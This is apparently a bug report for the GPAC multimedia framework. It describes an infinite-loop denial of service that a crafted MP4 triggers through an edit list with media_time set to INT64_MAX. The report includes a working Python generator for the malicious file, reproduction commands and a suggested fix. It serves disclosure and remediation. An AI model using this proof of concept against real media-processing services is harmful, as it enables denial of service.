# Infinite loop in edit list (elst) sample processing via crafted `media_time` (DoS)

- [x] I looked for a similar issue and couldn't find any clearly matching public GPAC issue for this exact path.
- [x] I tried with the latest version of GPAC.
- [x] I gave enough information for contributors to reproduce the issue (meaningful title, platform and compiler, command line, input file, etc.).

## Summary

A crafted MP4 file (~767 bytes) with an `elst` (Edit List) box containing `media_time = 0x7FFFFFFFFFFFFFFF` (INT64_MAX) causes GPAC's filter-based sample processing to enter an infinite loop. The process consumes 100% CPU and never terminates.

This is reproducible even without sanitizers using the standard `gpac` CLI tool:

```
gpac -i poc.mp4 inspect:deep:analyze=bs
```

In testing, the PoC produced over 1.6 million identical packets in 10 seconds before being killed by `timeout`. Every emitted packet has `dts="0" cts="0"`, the sample iterator never advances.

## Affected code path

- **Trigger:** Edit list (`elst`) box with `media_time = INT64_MAX`
- **Parser:** `elst_box_read()` in `src/isomedia/box_code_base.c` (line ~1248) reads `mediaTime` without bounds validation
- **Infinite loop:** The filter pipeline's sample dispatch logic (isoffin reader) uses the edit list to map media times. When `media_time = INT64_MAX`, the time mapping arithmetic produces a condition where the sample offset never advances, causing infinite re-emission of the same sample.

## Root cause

In `elst_box_read()`:

```c
p->segmentDuration = gf_bs_read_u64(bs);
p->mediaTime = (s64) gf_bs_read_u64(bs);
```

No validation is performed on `mediaTime`. When set to `0x7FFFFFFFFFFFFFFF`, downstream edit list time mapping logic overflows or fails to advance the sample cursor, producing an infinite loop of identical packet emissions through the filter chain.

## Tested version

- Commit: `a86cd52b6c2a59990cf66631dd33eebe1e87a918` (current `master` HEAD, Apr 7 2026)
- The `elst_box_read()` code at `src/isomedia/box_code_base.c:1248` is identical at this commit, no validation on `mediaTime`.

## Environment

- OS: Linux (Debian-based container)
- Compiler: `clang` (tested both with and without sanitizers)
- Reproduced with standard `gpac` CLI (no sanitizer required)

## Reproduction

### 1. Generate the PoC MP4

```bash
python3 gen_poc.py
```

### 2. Trigger the infinite loop

No special build flags needed. Using a standard GPAC build:

```bash
# This will hang indefinitely at 100% CPU — use timeout to limit
timeout 10 gpac -i poc.mp4 inspect:deep:analyze=bs 2>&1 | tail -5
```

Expected: the process emits hundreds of thousands of identical packets per second and never terminates. `timeout` kills it with exit code 124.

### PoC generator (`gen_poc.py`)

```python
#!/usr/bin/env python3
"""Generate PoC for GPAC Edit List (elst) infinite processing loop.

An elst box with media_time = INT64_MAX (0x7FFFFFFFFFFFFFFF) causes GPAC's sample processing to enter an infinite loop, emitting hundreds of thousands of identical packets per second.
"""
import struct, os

OUT = os.path.dirname(os.path.abspath(__file__))

def write_box(box_type, payload=b""):
    return struct.pack(">I", 8 + len(payload)) + box_type + payload

def write_fullbox(box_type, version=0, flags=0, payload=b""):
    return write_box(box_type, struct.pack(">I", (version << 24) | flags) + payload)

def make_minimal_mp4(trak_extra=b""):
    ftyp = write_box(b"ftyp", b"isom" + struct.pack(">I", 0x200) + b"isom" + b"mp41")
    mdat = write_box(b"mdat", b"\x00" * 100)
    mdhd = write_fullbox(b"mdhd", payload=struct.pack(">IIIIH2x", 0, 0, 90000, 90000, 0x55C4))
    hdlr = write_fullbox(b"hdlr", payload=b"\x00\x00\x00\x00" + b"vide" + b"\x00" * 12 + b"VideoHandler\x00")
    mp4v_box = write_box(b"mp4v",
        b"\x00" * 6 + struct.pack(">H", 1) + b"\x00" * 16 +
        struct.pack(">HH", 320, 240) + struct.pack(">II", 0x00480000, 0x00480000) +
        struct.pack(">I", 0) + struct.pack(">H", 1) + b"\x00" * 32 +
        struct.pack(">H", 0x0018) + struct.pack(">h", -1))
    stsd = write_fullbox(b"stsd", payload=struct.pack(">I", 1) + mp4v_box)
    stts = write_fullbox(b"stts", payload=struct.pack(">I I I", 1, 1, 90000))
    stsz = write_fullbox(b"stsz", payload=struct.pack(">II", 0, 1) + struct.pack(">I", 100))
    stco = write_fullbox(b"stco", payload=struct.pack(">II", 1, len(ftyp) + 8))
    stsc = write_fullbox(b"stsc", payload=struct.pack(">I III", 1, 1, 1, 1))
    stbl = write_box(b"stbl", stsd + stts + stsz + stco + stsc)
    url_box = write_fullbox(b"url ", flags=1)
    dref = write_fullbox(b"dref", payload=struct.pack(">I", 1) + url_box)
    dinf = write_box(b"dinf", dref)
    vmhd = write_fullbox(b"vmhd", flags=1, payload=struct.pack(">H HHH", 0, 0, 0, 0))
    minf = write_box(b"minf", vmhd + dinf + stbl)
    mdia = write_box(b"mdia", mdhd + hdlr + minf)
    tkhd = write_fullbox(b"tkhd", flags=3, payload=(
        struct.pack(">II", 0, 0) + struct.pack(">I", 1) + struct.pack(">I", 0) +
        struct.pack(">I", 90000) + b"\x00" * 8 + struct.pack(">hh", 0, 0) +
        struct.pack(">hH", 0, 0) +
        struct.pack(">9I", 0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000) +
        struct.pack(">II", 320 << 16, 240 << 16)))
    trak = write_box(b"trak", tkhd + mdia + trak_extra)
    mvhd = write_fullbox(b"mvhd", payload=(
        struct.pack(">II", 0, 0) + struct.pack(">I", 90000) + struct.pack(">I", 90000) +
        struct.pack(">I", 0x10000) + struct.pack(">H", 0x100) + b"\x00" * 10 +
        struct.pack(">9I", 0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000) +
        b"\x00" * 24 + struct.pack(">I", 2)))
    moov = write_box(b"moov", mvhd + trak)
    return ftyp + mdat + moov

def make_elst_overflow():
    elst = write_fullbox(b"elst", version=1, payload=(
        struct.pack(">I", 2) +
        struct.pack(">qqi", 90000, 0x7FFFFFFFFFFFFFFF, 0x10000) +
        struct.pack(">qqi", 90000, -1, 0x10000)))
    return make_minimal_mp4(trak_extra=write_box(b"edts", elst))

if __name__ == "__main__":
    out_path = os.path.join(OUT, "poc.mp4")
    with open(out_path, "wb") as f:
        f.write(make_elst_overflow())
    print(f"Written to {out_path}")
```

## Test results

| Command | Sanitizer? | Result |
|---------|-----------|--------|
| `timeout 10 gpac -i poc.mp4 inspect:deep:analyze=bs` | No | Infinite loop: 1,620,891 packets in 10s, exit 124 (killed) |
| `timeout 10 /out/fuzz_probe_analyze poc.mp4` | Yes (ASan) | Infinite loop: 504,790 packets in 10s, exit 124 (killed) |
| `MP4Box -info poc.mp4` | No | Completes normally (different code path) |

Sample output (all packets are identical, iterator never advances):

```
<Packet number="1" PID="1" framing="complete" dts="0" cts="0" dur="90000" sap="1" ...>
</Packet>
<Packet number="2" PID="1" framing="complete" dts="0" cts="0" dur="90000" sap="1" ...>
</Packet>
...
<Packet number="504790" PID="1" framing="complete" dts="0" cts="0" dur="90000" sap="1" ...>
```

## Impact

- CWE-835: Loop with Unreachable Exit Condition (Infinite Loop)
- Any application using GPAC's filter framework (`gpac` CLI, libgpac filter sessions) to process the crafted file will hang at 100% CPU indefinitely.
- This is a denial-of-service vulnerability. No sanitizer is required to trigger it.

## Suggested fix

Validate `mediaTime` in `elst_box_read()` to reject pathological values:

```c
p->mediaTime = (s64) gf_bs_read_u64(bs);
if (p->mediaTime != -1 && p->mediaTime < 0) {
    return GF_ISOM_INVALID_FILE;
}
```

Or add a guard in the filter pipeline's edit list mapping to detect and break the loop when the sample cursor fails to advance.

## Duplicate check

I did not find a clearly matching public GPAC issue or CVE for this exact path.
